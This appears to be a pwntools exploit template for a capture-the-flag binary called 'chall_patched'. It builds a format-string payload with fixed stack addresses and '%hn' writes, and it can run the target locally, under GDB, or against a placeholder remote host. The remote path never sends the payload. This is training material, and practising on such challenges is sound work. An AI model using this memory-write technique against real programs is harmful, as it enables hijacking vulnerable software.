#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

payload = flat(0xffffd0f8, 0xffffd0fa, b'.%48870x.%9$hn.%8124x.%10$hn')

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path, payload])
    else:
        return remote("addr", 1337)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    checkadd = io.readline()

    io.interactive()

if __name__ == "__main__":
    main()
